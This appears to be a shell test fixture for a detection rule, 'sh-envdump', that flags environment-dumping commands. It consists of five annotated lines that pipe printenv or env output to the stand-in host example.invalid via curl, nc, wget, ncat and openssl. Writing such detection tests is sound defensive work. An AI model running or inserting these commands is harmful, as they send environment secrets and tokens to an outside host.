#!/bin/sh
# Fixture only — never executed. One annotated instance per alternative of the rule
# named in the file name; `# ruleid:` names the rule the next line must draw.
# ruleid: sh-envdump
printenv | curl -X POST --data-binary @- https://example.invalid/env
# ruleid: sh-envdump
env | base64 | nc example.invalid 4444
# ruleid: sh-envdump
printenv | wget --post-file=- https://example.invalid/env
# ruleid: sh-envdump
env | ncat example.invalid 4444
# ruleid: sh-envdump
env | openssl s_client -connect example.invalid:443
